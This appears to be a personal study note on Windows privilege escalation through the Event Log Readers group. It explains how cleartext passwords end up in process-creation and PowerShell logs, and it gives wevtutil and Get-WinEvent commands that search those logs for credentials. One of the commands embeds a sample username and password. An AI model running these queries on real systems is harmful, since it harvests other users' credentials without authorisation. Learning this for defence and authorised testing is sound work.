
2026-05-21 15:47

Tags: #escalation  

## Event Log Readers

- **Purpose:** Grants members (such as developers or power users) *permission to read Windows event logs* without requiring full administrative rights.


- **Primary Target:** The Windows Security event log, specifically Event ID **4688** (A new process has been created).

## Defensive Context

- **Command Line Auditing:** When enabled, Windows logs the exact command-line arguments executed by users and applications.


- **Threat Detection:** Defenders route these logs to SIEMs (e.g., ElasticSearch) to detect initial access, reconnaissance, and lateral movement commands (e.g., `whoami`, `tasklist`, `net use`, `reg`).


- **Budget-Friendly EDR Alternative:** Provides massive host-level visibility and containment capabilities for organizations without expensive EDR solutions.

## Exploitation & Credential Harvesting

- **The Vulnerability:** Many Windows commands support passing passwords as parameters in the command line (e.g., `net use /user:admin MyPassword`).


- **The Exploit:** Attackers belonging to the Event Log Readers group can *search the process creation logs to hunt for these cleartext passwords.*


- **Alternative Unprivileged Targets:** The **PowerShell Operational log** is readable by unprivileged users and can also contain credentials if script block or module logging is enabled.

## Tooling & Commands

- **Confirm Group Membership:**
    - Check local assignments: `net localgroup "Event Log Readers"`
    - ![[Screenshot_20260521_155110.png]]


- **Querying Logs via `wevtutil` (Command Line):**
    - Extracting passwords locally: `wevtutil qe Security /rd:true /f:text | Select-String "/user"`
        
    - Querying remote logs with alternate credentials: `wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"`


- **Querying Logs via `Get-WinEvent` (PowerShell):**
    - Filtering for Event ID 4688 and extracting the command line: `Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}`
        
    - _Important Caveat:_ Group membership is **not** enough to search the Security log using `Get-WinEvent`. It requires full Administrator access or specific registry modifications (`HKLM\System\CurrentControlSet\Services\Eventlog\Security`).
## References:

